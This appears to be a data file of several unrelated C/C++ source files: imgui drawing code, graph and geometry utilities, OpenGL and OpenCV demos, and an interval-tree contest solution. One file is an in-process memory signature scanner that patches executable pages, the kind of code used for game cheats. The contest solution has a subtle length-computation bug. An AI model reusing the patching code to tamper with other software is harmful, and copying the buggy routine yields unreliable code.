    "// dear imgui, v1.91.3\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImTriangulator, ImDrawList concave polygon fill\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wreserved-identifier\"            // warning: identifier '_Xxx' is reserved because it starts with '_' followed by a capital letter\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warning: stack protector not protecting local variables: variable length buffer\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n// [S",
    "#include <stdexcept>\n#include \"client_commands.hpp\"\n#include \"../graph/mst_algo/MST_factory.hpp\"\n\nstd::vector<std::string> ClientCommands::split(const std::string &s, char delim) {\n    std::vector<std::string> result;\n    for (unsigned int i = 0; i < s.size(); i++) {\n        std::string token;\n        while (s[i] != delim && i < s.size()) {\n            token += s[i];\n            i++;\n        }\n        if (!token.empty()) result.push_back(token);\n    }\n    return result;\n}\n\nClientCommands::Command ClientCommands::get_command(const std::string &command_str) {\n    auto command = command_map.find(command_str);\n    return command == command_map.end() ? Command::INVALID : command->second;\n}\n\nGraph ClientCommands::handle_new_graph(const std::vector<std::string> &args) {\n    if (args.size() < 3) throw std::invalid_argument(\"Invalid number of arguments for new graph\");\n    unsigned int n = stoi(args[1]);\n    unsigned int m = stoi(args[2]);\n    unsigned int i;\n    Graph g(n);\n    for (i = 3; i+2 < args.size(); i += 3) {\n        g.add_edge(stoi(args[i]), stoi(args[i + 1]), stoi(args[i + 2]));\n    }\n    if (i != m * 3 + 3) throw std::invalid_argument(\"Invalid number of arguments for new graph\");\n    return g;\n}\n\nvoid ClientCommands::handle_add_edge(const std::vector<std::string> &args, Graph &graph) {\n    if (args.size() != 4) throw std::invalid_argument(\"Invalid number of arguments for add edge\");\n    graph.add_edge(stoi(args[1]), stoi(args[2]), stoi(args[3]));\n}\n\nvoid ClientCommands::handle_remove_edge(const std::vector<std::string> &args, Graph &graph) {\n    if (args.size() != 3) throw std::invalid_argument(\"Invalid number of arguments for remove edge\");\n    graph.remove_edge(stoi(args[1]), stoi(args[2]));\n}\n\nstd::string ClientCommands::handle_mst(const std::vector<std::string> &args, const Graph &graph) {\n    if (args.size() != 2) throw std::invalid_argument(\"Invalid number of arguments for mst\");\n    std::unique_ptr<MST_algorithm> mst_algo = MST_factory::get_algorithm(args[1]);\n    Tree tree = mst_algo->get_MST(graph);\n\n    std::string result;\n    result.append(\"Total weight of MST: \").append(std::to_string(tree.get_weight())).append(\"\\n\");\n    result.append(\"Longest distance between two vertices: \").append(std::to_string(tree.get_longest_distance())).append(\"\\n\");\n    result.append(\"Average distance between two vertices: \").append(std::to_string(tree.get_avg_distance())).append(\"\\n\");\n    result.append(\"Shortest distance between two vertices: \").append(std::to_string(tree.get_shortest_distance()));\n    return result;\n}\n\nstd::string ClientCommands::handle_print_graph(const Graph &graph) {\n    return graph.to_string();\n}\n",
    "#include \"mem.h\"\r\n\r\n#define INRANGE(x,a,b)  (x >= a && x <= b) \r\n#define getBits( x )    (INRANGE((x&(~0x20)),'A','F') ? ((x&(~0x20)) - 'A' + 0xa) : (INRANGE(x,'0','9') ? x - '0' : 0))\r\n#define getByte( x )    (getBits(x[0]) << 4 | getBits(x[1]))\r\n#define DEBUG_ERROR(msg, ...) MessageBoxA(0, std::format(msg, __VA_ARGS__).c_str(), \"Error\", MB_OK) \r\n//gets module information. poorly made\r\nuintptr_t mem::modinfo(info param) {\r\n    MODULEINFO moduleInfo{};\r\n    if (!GetModuleInformation((HANDLE)-1, GetModuleHandle(NULL), &moduleInfo, sizeof(MODULEINFO)) || !moduleInfo.lpBaseOfDll) {\r\n        std::cout << \"Couldnt GetModuleInformation\" << std::endl;\r\n        return 0;\r\n    }\r\n    switch (param)\r\n    {\r\n    case 1:\r\n        return (uintptr_t)moduleInfo.lpBaseOfDll; //returns module base\r\n        break;\r\n    case 2:\r\n        return (uintptr_t)moduleInfo.SizeOfImage; //return image size\r\n        break;\r\n    }\r\n}\r\n\r\nvoid mem::memcopy(BYTE* dst, BYTE* src, size_t size) {\r\n    DWORD oldprotect; //variable to hold protection\r\n    VirtualProtect(dst, size, PAGE_EXECUTE_READWRITE, &oldprotect); //make memory read/writeable and save the old protection\r\n    memcpy(dst, src, size); //typical memcopy\r\n    VirtualProtect(dst, size, oldprotect, &oldprotect); //restore our old protection\r\n}\r\n\r\n__int64 mem::find_pattern(__int64 range_start, __int64 range_end, const char* pattern) {\r\n    const char* pat = pattern;\r\n    __int64 firstMatch = NULL;\r\n    __int64 pCur = range_start;\r\n    __int64 region_end{};\r\n    MEMORY_BASIC_INFORMATION mbi{};\r\n    SIZE_T size = VirtualQuery((LPCVOID)pCur, &mbi, sizeof(mbi));\r\n\r\n    while (sizeof(mbi) == size) {\r\n        if (pCur >= range_end - strlen(pattern))\r\n        {\r\n            break;\r\n        }\r\n        if (!(mbi.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_READWRITE))) {\r\n            pCur += mbi.RegionSize;\r\n            continue;\r\n        }\r\n        region_end = pCur + mbi.RegionSize;\r\n\r\n        if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS && !(mbi.Protect & PAGE_GUARD))\r\n        {\r\n            region_end = pCur + mbi.RegionSize;\r\n            while (pCur < region_end)\r\n            {\r\n                if (!*pat)\r\n                    return firstMatch;\r\n                if (*(PBYTE)pat == '\\?' || *(BYTE*)pCur == getByte(pat)) {\r\n                    if (!firstMatch)\r\n                        firstMatch = pCur;\r\n                    if (!pat[1] || !pat[2])\r\n                        return firstMatch;\r\n                    if (*(PWORD)pat == '\\?\\?' || *(PBYTE)pat != '\\?')\r\n                        pat += 3;\r\n                    else\r\n                        pat += 2;\r\n                }\r\n                else {\r\n                    if (firstMatch)\r\n                        pCur = firstMatch;\r\n                    pat = pattern;\r\n                    firstMatch = 0;\r\n                }\r\n                pCur++;\r\n            }\r\n        }\r\n    }\r\n    return NULL;\r\n}\r\n\r\nScanner::Scanner(const char* pattern, const char* name, bool debug, std::ptrdiff_t offset) : name{ name }, debugflag{ debug }\r\n{\r\n    addr = (mem::find_pattern(searchStart, searchEnd, pattern) + (offset));\r\n}\r\n\r\nauto Scanner::validaddr() -> bool\r\n{\r\n    if (is_bad_ptr(addr))\r\n    {\r\n        if (debugflag)\r\n        {\r\n            DEBUG_ERROR(\"FAILED!! {} @ : {:#x}\", name, addr);\r\n        }\r\n        return false;\r\n    }\r\n    if (is_valid_ptr(addr))\r\n    {\r\n        if (debugflag)\r\n        {\r\n            DEBUG_ERROR(\"found {} @: {:#x}. offset: {:#x}\", name, addr, addr - g_vars->baseModule);\r\n        }\r\n        return true;\r\n    }\r\n};\r\n\r\nauto Scanner::getaddr() -> std::ptrdiff_t {\r\n    if (validaddr()) {\r\n        return addr;\r\n    }\r\n    return NULL;\r\n};\r\n\r\nauto Scanner::resolve_call() -> std::ptrdiff_t {\r\n    if (validaddr()) {\r\n        return *(int*)(addr + 1) + addr + 5;\r\n    }\r\n    return NULL;\r\n};\r\n\r\nauto Scanner::resolve_lea() -> std::ptrdiff_t {\r\n    if (validaddr()) {\r\n        return *(int*)(addr + 3) + addr + 7;\r\n    }\r\n    return NULL;\r\n};\r\n\r\n//works with XOR\r\nauto Scanner::resolve_cmp() -> std::ptrdiff_t {\r\n    if (validaddr()) {\r\n        return *(int*)(addr + 2) + addr + 6;\r\n    }\r\n    return NULL;\r\n};\r\n\r\n",
    "#include <opencv4/opencv2/opencv.hpp>\n#include <iostream>\n#include <math.h>\n#include <cstdlib> // untuk rand() dan srand()\n#include <ctime>   // untuk time()\n#include \"../lib/bullet.hpp\"\n\nusing namespace std;\nusing namespace cv;\n\n\nPoint randomPosition(int width, int height) {\n    int x = rand() % width;\n    int y = rand() % height;\n    return Point(x, y);\n}\n\n\nPoint randomSpeed() {\n    int speedX = (rand() % 5) + 1;\n    int speedY = (rand() % 5) + 1;\n    if (rand() % 2 == 0) speedX = -speedX;\n    if (rand() % 2 == 0) speedY = -speedY;\n    return Point(speedX, speedY);\n}\n\nint main() {\n    VideoCapture kamera(0);\n    if (!kamera.isOpened()) {\n        cerr << \"tidak bisa membuka\" << endl;\n        return -1;\n    }\n\n    Mat frame;\n    int initial_score = 0;\n    int bulletSize = 20;\n    int height = kamera.get(CAP_PROP_FRAME_HEIGHT);\n    int width = kamera.get(CAP_PROP_FRAME_WIDTH);\n    // cout << \"WIDTH : \" << width << endl;\n    // cout << \"HEIGHT : \" << height << endl;\n\n    // spawn bullet first time\n    Bullet bullet(randomPosition(width, height).x, randomPosition(width, height).y, bulletSize, randomSpeed());\n    \n    while (true) {\n        kamera >> frame;\n\n        // score\n        string score = \"Score = \" + to_string(initial_score);\n        putText(frame, score, Point(10, 100), FONT_HERSHEY_DUPLEX, 1.0, CV_RGB(0, 255, 0), 1);\n\n        Mat hsv, lim_color;\n\n        // convert to hsv\n        cvtColor(frame, hsv, COLOR_BGR2HSV);\n\n        // detect red color\n        inRange(hsv, Scalar(0, 159, 116), Scalar(179, 255, 168), lim_color);\n\n        vector<vector<Point>> kontur;\n        findContours(lim_color, kontur, RETR_EXTERNAL, CHAIN_APPROX_SIMPLE);\n\n        Point2f circleCenter;\n        float radius;\n        bool circleActive = false;\n\n        // draw circle\n        for (size_t i = 0; i < kontur.size(); i++) {\n            Moments m = moments(kontur[i]);\n            minEnclosingCircle(kontur[i], circleCenter, radius);\n\n            // cout << \"Koordinat merah: (\" << circleCenter.x << \", \" << circleCenter.y << \")\" << endl;\n            circle(frame, circleCenter, (int)radius, Scalar(0, 255, 0), 2);\n            circleActive = true;\n        }\n\n        // draw bullet\n        bullet.update(width, height); // Pass height for boundary check\n        bullet.draw(frame);\n\n        // check if bullet in the circle\n        if (circleActive) {\n            Point bulletPosition = bullet.getPosition();\n            // d = sqrt((x-h)^2 + (y-k)^2)\n            double distanceSquared = sqrt(pow((bulletPosition.x - circleCenter.x), 2) + pow((bulletPosition.y - circleCenter.y), 2)); \n            if (distanceSquared < radius) {\n                initial_score++;\n                // cout << \"Score: \" << initial_score << endl;\n\n                // reset bullet\n                bullet = Bullet(randomPosition(width, height).x, randomPosition(width, height).y, bulletSize, randomSpeed());\n            }\n        }\n\n        imshow(\"kamera\", frame);\n        if (waitKey(30) == 32) { \n            break;\n        }\n    }\n\n    return 0;\n}",
    "#include<GL/glut.h>\n#include<stdlib.h>\n#include<stdio.h>\n#include<math.h>\n#include<string.h>\nconst float DEG2RAD = 3.14159/180;\nvoid stars();\nint p;\nvoid stars1();\nvoid static_rocket();\nvoid rocket_to_cam_pos();\nvoid rocket_in_motion();\nvoid mars(float radius);\n\nfloat i,j,count=0,count1=0,count3=0,flag=0,flag1=0,t=0,f=0,flag3=0;\n\n// fucntion to display the text content of the home screen\nvoid drawstring(int x, int y, char *s)\n{\n\tchar *c;\n\tglRasterPos2i(x, y);\n\tfor (c = s; *c != '\\0'; *c++)\n\t\tglutBitmapCharacter(GLUT_BITMAP_8_BY_13, *c);\n}\n\nvoid semicircle(float radius,float u,float v)\n{\n\n\tglColor3f(1.0 ,1.0 ,1.0);\n   glBegin(GL_POLYGON);\n\n   for (int i=135; i<=315; i++)\n   {\n      float degInRad = i*DEG2RAD;\n      glVertex2f(u+cos(degInRad)*radius,v+(sin(degInRad))*radius);//100,100 specifies centre of the circle\n   }\n\n   glEnd();\n}\n\n//determines the state of rocket launch\nvoid control()\n{\n\tcount1++;\n\tif(count1==250)\n      \t\tflag=1;\n\n\telse if (flag == 1 && (count1 == 600 || count1 == 601))\n\t\trocket_to_cam_pos();\n\n\telse if (flag == 1 && count1 >= 1000)\n\t\trocket_in_motion();\n}\n\nvoid stars()\n{\n\n\tglColor3f(1.0,1.0,1.0);\n\tglPointSize(1.37);\n\tglBegin(GL_POINTS);\n\tglVertex2i(10,20);\n\tglVertex2i(20,100);\n\tglVertex2i(30,10);\n\tglVertex2i(15,150);\n\tglVertex2i(17,80);\n\tglVertex2i(200,200);\n\tglVertex2i(55,33);\n\tglVertex2i(400,300);\n\tglVertex2i(330,110);\n\tglVertex2i(125,63);\n\tglVertex2i(63,125);\n\tglVertex2i(20,10);\n\tglVertex2i(110,330);\n\tglVertex2i(440,430);\n\tglVertex2i(32,65);\n\tglVertex2i(110,440);\n\tglVertex2i(210,230);\n\tglVertex2i(390,490);\n\tglVertex2i(12,90);\n\tglVertex2i(400,322);\n\tglVertex2i(420,366);\n\tglVertex2i(455,400);\n\tglVertex2i(20,20);\n\tglVertex2i(111,120);\n\tglVertex2i(401,200);\n\tglVertex2i(230,30);\n\tglVertex2i(220,20);\n\tglVertex2i(122,378);\n\tglVertex2i(133,340);\n\tglVertex2i(345,420);\n\tglVertex2i(130,360);\n\tglVertex2i(333,120);\n\tglVertex2i(250,22);\n\tglVertex2i(242,11);\n\tglVertex2i(280,332);\n\tglVertex2i(233,40);\n\tglVertex2i(210,418);\n\tglVertex2i(256,12);\n\tglVertex2i(288,232);\n\tglVertex2i(247,36);\n\tglVertex2i(229,342);\n\tglVertex2i(257,47);\n\tglVertex2i(290,63);\n\tglVertex2i(232,72);\n\tglVertex2i(243,143);\n\tglVertex2i(100,200);\n\tglVertex2i(90,250);\n\tglVertex2i(80,225);\n\tglVertex2i(50,333);\n\tglVertex2i(60,350);\n\tglVertex2i(243,143);\n\tglVertex2i(243,143);\n\tglEnd();\n}\n\nvoid stars1()\n{\n\tint l;\n\tglColor3f(1.0,1.0,1.0);\n\tglPointSize(1.0);\n\tglBegin(GL_POINTS);\n\tglVertex2i(50,20);\n\tglVertex2i(70,100);\n\tglVertex2i(80,10);\n\tglVertex2i(65,150);\n\tglVertex2i(67,80);\n\tglVertex2i(105,33);\n\tglVertex2i(450,300);\n\tglVertex2i(380,110);\n\tglVertex2i(175,63);\n\tglVertex2i(113,125);\n\tglVertex2i(70,10);\n\tglVertex2i(160,330);\n\tglVertex2i(490,430);\n\tglVertex2i(82,65);\n\tglVertex2i(160,440);\n\tglVertex2i(440,490);\n\tglVertex2i(62,90);\n\tglVertex2i(450,322);\n\tglVertex2i(420,366);\n\tglVertex2i(455,400);\n\tglVertex2i(60,20);\n\tglVertex2i(111,120);\n\tglVertex2i(451,200);\n\tglVertex2i(280,30);\n\tglVertex2i(220,20);\n\tglVertex2i(132,378);\n\tglVertex2i(173,340);\n\tglVertex2i(325,420);\n\tglVertex2i(180,360);\n\tglVertex2i(383,120);\n\tglVertex2i(200,22);\n\tglVertex2i(342,11);\n\tglVertex2i(330,332);\n\tglVertex2i(283,40);\n\tglVertex2i(210,418);\n\tglVertex2i(256,12);\n\tglVertex2i(288,232);\n\tglVertex2i(247,36);\n\tglVertex2i(229,342);\n\tglVertex2i(257,47);\n\tglVertex2i(290,63);\n\tglVertex2i(232,72);\n\tglVertex2i(243,143);\n\tglVertex2i(100,200);\n\tglVertex2i(90,250);\n\tglVertex2i(80,225);\n\tglVertex2i(50,333);\n\tglVertex2i(60,350);\n\tglVertex2i(243,143);\n\tglVertex2i(243,143);\n\tglEnd();\n\tfor(l=0;l<=10000;l++)\n\t\t;\n}\nvoid static_rocket()\n{\n\ncount1++;\nif(count1==150)\nflag=1;\n  if(flag==0)\n  {\n\tglClearColor(0.196078  ,0.6 ,0.8,1.0);\n\tglClear(GL_COLOR_BUFFER_BIT|GL_DEPTH_BUFFER_BIT);\n\n\tglColor3f(0.4,0.25,0.1);\n\t\tglBegin(GL_POLYGON);//green ground\n\t\tglVertex2f(0.0,0.0);\n\t\tglVertex2f(0.0,250.0);\n\t\tglVertex2f(270.0,250.0);\n\t\tglVertex2f(500.0,50.0);\n\t\tglVertex2f(500.0,0.0);\n\t\tglEnd();\n\t\tglBegin(GL_POLYGON);//green ground\n\t\tglVertex2f(280.0,250.0);\n\t\tglVertex2f(500.0,250.0);\n\t\tglVertex2f(500.0,60.0);\n\t\tglEnd();\n\t\tglColor3f(0.0,0.0,0.0);\n\t\t\tglBegin(GL_POLYGON);//road\n\t\tglVertex2f(260.0,250.0);\n\t\tglVertex2f(290.0,250.0);\n\t\tglVertex2f(500.0,70.0);\n\t\tglVertex2f(500.0,40.0);\n\t\tglEnd();\n\t\tglColor3f(0.0,0.0,0.0);\n\n\n\t\tglColor3f(0.8,0.498039 ,0.196078);\n\t\t\tglBegin(GL_POLYGON);//house 1\n\t\tglVertex2f(250.0,250.0);\n\t\tglVertex2f(300.0,250.0);\n\t\tglVertex2f(300.0,350.0);\n\t\tglVertex2f(250.0,350.0);\n\t\tglEnd();\n\t\tglColor3f(0.7,0.7,0.7);\n\t\tglBegin(GL_POLYGON);//HOUSE A\n\t\t\tglVertex2f(255,267.5);\n\t\t\tglVertex2f(275.0,267.5);\n\t\t\tglVertex2f(275.0,277.5);\n\t\t\tglVertex2f(255.0,277.5);\n\t\t\tglEnd();\n\t\tglBegin(GL_POLYGON);//HOUSE B\n\t\t\tglVertex2f(255,285.0);\n\t\t\tglVertex2f(275.0,285);\n\t\t\tglVertex2f(275.0,295);\n\t\t\tglVertex2f(255.0,295);\n\t\t\tglEnd();\n\n\t\tglBegin(GL_POLYGON);//HOUSE C\n\t\t\tglVertex2f(255,302.5);\n\t\t\tglVertex2f(275.0,302.5);\n\t\t\tglVertex2f(275.0,312.5);\n\t\t\tglVertex2f(255.0,312.5);\n\t\t\tglEnd();\n\n\t\tglBegin(GL_POLYGON);//HOUSE D\n\t\t\tglVertex2f(255,320.0);\n\t\t\tglVertex2f(275.0,320.0);\n\t\t\tglVertex2f(275.0,330.0);\n\t\t\tglVertex2f(255.0,33",
    "#include \"QuadMesh.h\"\r\n\r\nQuadMesh::QuadMesh() {\r\n    // Constructor: Can initialize anything related to the mesh here\r\n}\r\n\r\n// Function to setup lighting\r\nvoid QuadMesh::setupLighting() {\r\n    glEnable(GL_LIGHTING);\r\n    glEnable(GL_LIGHT0);  // Enable a light source\r\n    \r\n    // Define light properties\r\n    GLfloat light_position[] = { 0.0, 5.0, 5.0, 1.0 }; // Light positioned above and in front\r\n    GLfloat ambient_light[] = { 0.2, 0.2, 0.2, 1.0 };  // Ambient light\r\n    GLfloat diffuse_light[] = { 0.8, 0.8, 0.8, 1.0 };  // Diffuse light\r\n    GLfloat specular_light[] = { 1.0, 1.0, 1.0, 1.0 }; // Specular highlights\r\n    \r\n    glLightfv(GL_LIGHT0, GL_POSITION, light_position);\r\n    glLightfv(GL_LIGHT0, GL_AMBIENT, ambient_light);\r\n    glLightfv(GL_LIGHT0, GL_DIFFUSE, diffuse_light);\r\n    glLightfv(GL_LIGHT0, GL_SPECULAR, specular_light);\r\n    \r\n    // Enable shading model\r\n    glShadeModel(GL_SMOOTH);\r\n\r\n    glEnable(GL_COLOR_MATERIAL); //Enable glColor\r\n\r\n\r\n}\r\n\r\n// Function to draw a basic quad mesh (useful for shadow projections later)\r\nvoid QuadMesh::drawQuadMesh() {\r\n    // Set color for the ground (e.g., green)\r\n    glColor3f(0.7f, 0.7f, 0.0f);  // Example color: green\r\n        \r\n    \r\n    glBegin(GL_QUADS);\r\n    // Define vertices of a quad (these could represent a ground plane)\r\n    glNormal3f(0.0, 1.0, 0.0);  // Normal pointing up\r\n    glVertex3f(-5.0, -5.0, -5.0);\r\n    glVertex3f(5.0, -5.0, -5.0);\r\n    glVertex3f(5.0, -5.0, 5.0);\r\n    glVertex3f(-5.0, -5.0, 5.0);\r\n    glEnd();\r\n}\r\n\r\n",
    "#include \"field.h\"\n\nField::Field(QWidget *parent) : QWidget(parent)\n{\n}\n\nField::~Field()\n{\n}\n\nvoid Field::mousePressEvent(QMouseEvent* pe)\n{\n    QPoint point = pe->pos();\n    m_Points.append(point);\n    update();\n}\n\nvoid Field::DrawPoints(QPainter *painter)\n{\n    painter->drawPoints(QPolygon(m_Points));\n\n    text_edit text = text_edit(Points);\n    QString result = ResultTextForTextEditor(text);\n    emit updateText(result);\n}\n\nvoid Field::DrawConvexHull(QPainter *painter)\n{\n    Point Tmp;\n    m_ConvexHullPoints = Tmp.ConvexHull(m_Points);\n\n    text_edit text = text_edit (Square);\n    QString result = ResultTextForTextEditor(text);\n    emit updateText(result);\n\n    painter->drawPoints(QPolygon(m_Points));\n    painter->drawPolygon(QPolygon(m_ConvexHullPoints.ToVector()));\n}\n\nvoid Field::paintEvent(QPaintEvent */*event*/)\n{\n    QPainter painter(this);\n    painter.setRenderHints(QPainter::Antialiasing, true);\n    painter.setPen(QPen(Qt::black, 5, Qt::SolidLine, Qt::RoundCap));\n    switch (m_action)\n    {\n        case DrawPoint:\n            DrawPoints(&painter);\n            break;\n        case DrawConture:\n            DrawConvexHull(&painter);\n            break;\n    }\n}\n\nQString Field::TextSquare()\n{\n    QString square = QString::number(m_ConvexHullPoints.SquarePolygon());\n    return QString(\"\u041f\u043b\u043e\u0449\u0430\u0434\u044c: \" + square + \"\\n\");\n}\n\nQString Field::TextPoints()\n{\n    if (m_Points.empty())\n    {\n        return QString(\"\");\n    }\n    QString result = \"\u0422\u043e\u0447\u043a\u0438: \\n\";\n    for (int i = 0; i < m_Points.size(); ++i)\n    {\n        QString x = QString::number(m_Points[i].x());\n        QString y = QString::number(m_Points[i].y());\n        QString statement = x + \" \" + y + \"\\n\";\n        result+= statement;\n    }\n    return result;\n}\n\nQString Field::ResultTextForTextEditor(text_edit text)\n{\n    QString result;\n    switch (text)\n    {\n        case Square:\n            result += TextSquare();\n\n        case Points:\n            result += TextPoints();\n        break;\n\n    }\n\n    return result;\n}\n\n//slots\nvoid Field::SetAction(action action)\n{\n    this->m_action = action;\n    update();\n}\n\nvoid Field::OnBtnClear()\n{\n    m_Points.clear();\n    SetAction(action(DrawPoint));\n}\n\nvoid Field::OnBtnCalculate()\n{\n    if (this->m_action == action(DrawPoint))\n    {\n        SetAction(action(DrawConture));\n    }\n    else\n    {\n        SetAction(action(DrawPoint));\n    }\n}\n",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n#define ll long long\r\n#define int ll\r\n#define IT set<ODT>::iterator\r\nstruct ODT{\r\n    int l,r;\r\n    mutable ll v;\r\n    ODT(int L,int R=-1,ll V=0):l(L),r(R),v(V){}\r\n    bool operator < (ODT A) const{\r\n        return l<A.l;\r\n    }\r\n};\r\nset<ODT> s;\r\nIT split(int pos){\r\n    IT it=s.lower_bound(ODT(pos));\r\n    if(it!=s.end()&&it->l==pos) return it;  // \u4e0d\u7528\u5207\u7684\u60c5\u6cc1\r\n    it--;  //\u4e0d\u7136\u4e00\u5b9a\u5728\u524d\u4e00\u500b\r\n    int l=it->l,r=it->r;\r\n    ll v=it->v;\r\n    s.erase(it);\r\n    s.insert(ODT(l,pos-1,v));\r\n    return s.insert(ODT(pos,r,v)).first;\r\n}\r\nvoid update(int l,int r,ll v){\r\n    IT R=split(r+1),L=split(l);\r\n    s.erase(L,R);\r\n    s.insert(ODT(l,r,v));\r\n}\r\nvoid inc(int l,int r,ll v){\r\n    IT R=split(r+1),L=split(l);\r\n    for(;L!=R;L++){\r\n        L->v+=v;\r\n    }\r\n}\r\nll query(int l,int r,int k){\r\n    IT R=split(r+1),L=split(l);\r\n    vector<pair<ll,int>> v;\r\n    for(;L!=R;L++){\r\n        v.push_back(pair<ll,int>(L->v,L->r-L->l+1));\r\n        //cerr<<v.back().first<<' '<<v.back().second<<'\\n';\r\n    }\r\n    sort(v.begin(),v.end());\r\n    for(auto at:v){\r\n        k-=at.second;\r\n        if(k<=0) return at.first;\r\n    }\r\n   // cerr<<\"EEE\\n\";\r\n}\r\nll n,q,a[200500],vmax,seed;\r\ninline long long rg() \r\n{\r\n    long long ret = seed;\r\n    seed = (seed * 7LL + 13) % 1000000007LL;\r\n    return ret;\r\n}\r\n\r\nint op,l,r,x,y;\r\nll fp(int res,int pw,int md){\r\n    ll ret=1;\r\n    while(pw){\r\n        if(pw&1) ret=(ret*res)%md;\r\n        res=(res*res)%md;\r\n        pw>>=1;\r\n    }\r\n    return ret;\r\n}\r\nint query(int lL,int rr,int xx,int yy){\r\n    ll ret=0;\r\n    IT R=split(rr+1),L=split(lL);\r\n    for(;L!=R;L++){\r\n        ret=(ret+fp(L->v,xx,yy)*(L->l-L->r+1)%yy)%yy;\r\n    }\r\n    return ret;\r\n}\r\nsigned main(){\r\n    cin>>n>>q>>seed>>vmax;\r\n    for(int i=1;i<=n;i++){\r\n        a[i]=rg()%vmax+1;\r\n        s.insert(ODT(i,i,a[i]));\r\n    }\r\n    s.insert(ODT(n+1,n+1,0));\r\n    while(q--){\r\n        op=rg()%4+1;\r\n        l=rg()%n+1,r=rg()%n+1;\r\n        if(l>r) swap(l,r);\r\n        if(op==3) x=rg()%(r-l+1)+1;\r\n        else x=rg()%vmax+1;\r\n        if(op==4) y=rg()%vmax+1;\r\n        if(op==1){\r\n            inc(l,r,x);\r\n        }else if(op==2){\r\n            update(l,r,x);\r\n        }else if(op==3){\r\n           // cerr<<l<<' '<<r<<'\\n';\r\n            cout<<query(l,r,x)<<'\\n';\r\n        }else{\r\n            cout<<query(l,r,x,y)<<'\\n';\r\n        }\r\n    }\r\n}",
